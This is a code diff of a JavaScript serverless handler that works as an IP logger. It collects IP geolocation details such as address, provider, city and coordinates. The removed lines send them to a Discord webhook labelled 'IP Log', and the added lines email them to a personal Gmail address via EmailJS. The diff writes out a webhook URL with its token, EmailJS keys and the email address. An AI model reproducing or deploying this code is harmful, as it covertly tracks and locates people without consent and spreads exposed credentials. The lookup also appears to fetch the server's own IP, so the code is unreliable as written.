@@ -1,27 +1,39 @@
+import emailjs from 'emailjs-com';
+
 export default async function handler(req, res) {
+    // Fetch IP data from the ip-api
     const ipRes = await fetch('https://ip-api.com/json/');
     const ipData = await ipRes.json();
 
-    const webHookUrl = "https://discord.com/api/webhooks/1362830306012303441/YEjx62A1a0Qw_k8BhIpOWhhD22yW4timN0R_lcsC-8Xz_txQ83gQqB2TjpiN_gTm3_fr";
+    // EmailJS configuration
+    const serviceID = 'service_x25rs8q';  // Replace with your EmailJS service ID
+    const templateID = 'template_3mgw9je'; // Replace with your EmailJS template ID
+    const publicKey = '4ItP8f4Z88r0-9S1M'; // Replace with your EmailJS public key
 
-    const countryCode = ipData.countryCode.toLowerCase();
-
-    const params = {
-        username: "IP Log",
-        avatar_url: "",
-        content: `__**🌐 IP Address:**__\n\`${ipData.query}\`\n\n` +
-                 `__**📞 Provider:**__\n${ipData.org} (${ipData.as})\n\n` +
-                 `__**🗺 Timezone:**__\n${ipData.timezone}\n\n` +
-                 `__**🏳 Country and Region:**__\n${ipData.country} - ${ipData.regionName}\n\n` +
-                 `__**🏙 Zip Code & City:**__\n${ipData.zip} ${ipData.city}\n\n` +
-                 `__**📍 Location:**__\n**Longitude:** ${ipData.lon}\n**Latitude:** ${ipData.lat}`
+    // Map the IP data to the template fields
+    const emailParams = {
+        to_email: 'boriszarkov4@gmail.com',  // Replace with your email
+        ip_address: ipData.query,  // The IP Address
+        provider: ipData.org + " (" + ipData.as + ")",  // Provider and ASN
+        timezone: ipData.timezone,  // Timezone
+        country: ipData.country,  // Country
+        city: ipData.city,  // City
+        zip: ipData.zip,  // Zip Code
+        latitude: ipData.lat,  // Latitude
+        longitude: ipData.lon  // Longitude
     };
 
-    await fetch(webHookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(params),
-    });
+    // Send the data to your email using EmailJS
+    try {
+        const response = await emailjs.send(serviceID, templateID, emailParams, publicKey); // Use the public key for frontend requests
+        console.log('Email sent successfully:', response);
 
-    res.status(200).json({ message: "IP info sent to Discord." });
+        // Respond with success
+        res.status(200).json({ message: 'IP info sent to your email.' });
+    } catch (error) {
+        console.error('Error sending email:', error);
+
+        // Respond with failure
+        res.status(500).json({ error: 'Failed to send email.' });
+    }
 }
